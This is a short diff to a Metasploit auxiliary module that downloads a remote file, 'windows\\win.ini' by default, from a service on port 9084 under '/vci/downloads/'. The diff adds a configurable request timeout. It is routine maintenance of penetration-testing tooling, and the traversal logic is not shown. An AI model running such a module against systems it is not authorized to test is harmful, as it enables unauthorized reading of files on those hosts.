@@ -37,9 +37,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(9084),
-        OptString.new('URIPATH', [true, 'URI path to the downloads', '/vci/downloads/']),
-        OptString.new('FILE', [true, 'Define the remote file to download', 'windows\\win.ini'])
+        OptString.new('URIPATH', [ true, 'URI path to the downloads', '/vci/downloads/' ]),
+        OptString.new('FILE', [ true, 'Define the remote file to download', 'windows\\win.ini' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -52,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_raw({
       'method' => 'GET',
       'uri'    => uri
-    }, 25)
+    }, timeout)
 
     # If there's no response, don't bother
     if res.nil? or res.body.empty?
